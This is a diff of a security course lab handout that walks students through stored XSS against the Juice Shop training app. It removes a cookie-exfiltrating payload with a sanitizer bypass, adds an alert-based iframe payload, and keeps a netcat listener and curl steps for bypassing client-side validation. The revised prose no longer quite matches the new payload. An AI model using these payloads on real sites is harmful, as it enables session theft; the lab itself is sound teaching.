@@ -1,5 +1,10 @@
 Computer Security Lab 2: Networks and web security
 ====
+## Preliminary tasks
+
+* Read the theory part from this document
+* 
+* 
 
 ## About the lab
 
@@ -245,17 +250,15 @@ XSS attacks above are relatively harmless, as they affect only you. It would be 
 
 For this example we are going to use the following code snippet: 
 ```javascript
-<a|ascript><img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   ></script>
+<iframe src=\"http://localhost:5555\" onload=\"alert(document.cookie)\"></iframe>
 ```
-
-* We can bypass the basic sanitizer that is used on the admin page with ```a|a``` in the beginning of the script. Try the script without it to see the effect.
 
 This will make the server attempt to fetch an image from a server we control and when it fails the server will send back the users cookies. This means we need a server. For this, we can utilize netcat. Use the following command to start a TCP server which listens to port 5555.
 ```shell
 ~$ nc -l -p 5555 -v
 ```
 
-You can't create a user with the name ```<a|ascript><img src=http://127.0.0.1:5555?c='+ escape(document.cookie)+ '   ></script>``` using the site's own create account page. This is because Juice Shop validates the input in the client-side **but** not on the server-side. For this reason, we are going to use curl to send the user creation packet directly to the API, this way bypassing the site's input validation. In order to do this, we need to know what type of packet the API expects.
+You can't create a user with the previously mentioned ```iframe``` object as its name using the site's own create account page. This is because Juice Shop validates the input in the client-side **but** not on the server-side. For this reason, we are going to use curl to send the user creation packet directly to the API, this way bypassing the site's input validation. In order to do this, we need to know what type of packet the API expects.
 
 We can find out the type of packet we need in the following way:
 
